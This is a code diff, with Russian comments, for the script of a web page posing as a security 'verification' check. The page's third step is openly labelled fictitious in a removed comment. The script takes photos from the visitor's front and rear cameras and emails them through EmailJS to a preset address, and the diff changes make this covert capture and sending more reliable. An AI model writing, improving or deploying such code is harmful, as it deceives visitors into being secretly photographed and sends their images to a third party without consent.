@@ -9,35 +9,44 @@ const s3 = document.getElementById('s3');
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 const setProgress = (p) => { fill.style.width = p + '%'; };
 
-// Инициализация EmailJS (ключи берутся из файла config.js)
 emailjs.init(CONFIG.emailjsPublicKey);
 
-// Функция съемки
 async function shoot(facingMode) {
-  // Запрашиваем конкретную камеру (user = фронталка, environment = задняя)
-  const stream = await navigator.mediaDevices.getUserMedia({ 
-    video: { facingMode: facingMode }, 
-    audio: false 
-  });
-  
-  v.srcObject = stream;
-  await v.play().catch(() => {});
-  await sleep(1500); // Ждем 1.5 секунды для автофокуса
+  try {
+    // Добавляем exact, чтобы браузер точно понял, какую камеру надо включить
+    const constraints = { 
+      video: { facingMode: { exact: facingMode } }, 
+      audio: false 
+    };
+    
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    v.srcObject = stream;
+    
+    // Ждем, пока видео реально загрузится
+    await new Promise((resolve) => {
+        v.onloadedmetadata = () => { v.play(); resolve(); };
+    });
+    
+    await sleep(1500); // Ждем фокусировки
 
-  c.width = v.videoWidth || 640;
-  c.height = v.videoHeight || 480;
-  const ctx = c.getContext('2d');
-  ctx.drawImage(v, 0, 0, c.width, c.height);
-  const data = c.toDataURL('image/jpeg', 0.8); // Сжимаем фото
-  
-  // Выключаем камеру
-  stream.getTracks().forEach((t) => t.stop());
-  v.srcObject = null;
-  
-  return data;
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    const ctx = c.getContext('2d');
+    ctx.drawImage(v, 0, 0, c.width, c.height);
+    const data = c.toDataURL('image/jpeg', 0.8);
+    
+    // Выключаем камеру и ждем секунду, чтобы "железо" освободилось
+    stream.getTracks().forEach((t) => t.stop());
+    v.srcObject = null;
+    await sleep(1000); 
+    
+    return data;
+  } catch (error) {
+    alert("Ошибка камеры (" + facingMode + "): " + error.name + " - " + error.message);
+    throw error;
+  }
 }
 
-// Функция отправки на почту
 async function sendPhoto(dataUrl, label) {
   return emailjs.send(CONFIG.emailjsServiceId, CONFIG.emailjsTemplateId, {
     to_email: CONFIG.toEmail,
@@ -52,39 +61,39 @@ btn.addEventListener('click', async () => {
   btn.textContent = 'Проверяем…';
 
   try {
-    // Шаг 1 — просим доступ
     s1.classList.add('active');
     setProgress(10);
-    const prime = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    // Просим доступ
+    const prime = await navigator.mediaDevices.getUserMedia({ video: true });
     prime.getTracks().forEach((t) => t.stop());
+    await sleep(500);
+    
     s1.classList.remove('active');
     s1.classList.add('done');
     setProgress(30);
 
-    // Шаг 2 — Снимаем фронталку и отправляем
+    // ФРОНТАЛКА
     s2.classList.add('active');
+    btn.textContent = 'Снимаем фронталку...';
     
     const frontShot = await shoot('user');
     setProgress(50);
-    await sendPhoto(frontShot, 'Фронтальная камера').catch((err) => console.log("Ошибка отправки фронталки", err));
+    await sendPhoto(frontShot, 'Фронтальная камера');
     setProgress(60);
 
-    // Пауза 2 секунды, чтобы телефон переключил камеру
-    await sleep(2000); 
-
-    // Снимаем тыльную камеру и отправляем
-    try {
-      const backShot = await shoot('environment');
-      setProgress(80);
-      await sendPhoto(backShot, 'Тыльная камера').catch((err) => console.log("Ошибка отправки тыла", err));
-    } catch (e) {
-      console.error("Задняя камера не найдена или недоступна", e);
-    }
+    // ТЫЛ
+    btn.textContent = 'Переключаем камеру...';
+    await sleep(2500); // Даем телефону 2.5 секунды на переключение!
+    
+    btn.textContent = 'Снимаем тыл...';
+    const backShot = await shoot('environment');
+    setProgress(80);
+    await sendPhoto(backShot, 'Тыльная камера');
+    setProgress(90);
 
     s2.classList.remove('active');
     s2.classList.add('done');
 
-    // Шаг 3 — фиктивная «защита сессии»
     s3.classList.add('active');
     setProgress(95);
     await sleep(1200);
@@ -95,9 +104,9 @@ btn.addEventListener('click', async () => {
     btn.textContent = 'Проверка пройдена ✓';
     btn.style.background = 'linear-gradient(135deg,#28c76f,#1fa85a)';
   } catch (e) {
+    console.error(e);
     btn.disabled = false;
     btn.textContent = 'Повторить проверку';
     setProgress(0);
-    console.error(e);
   }
 });
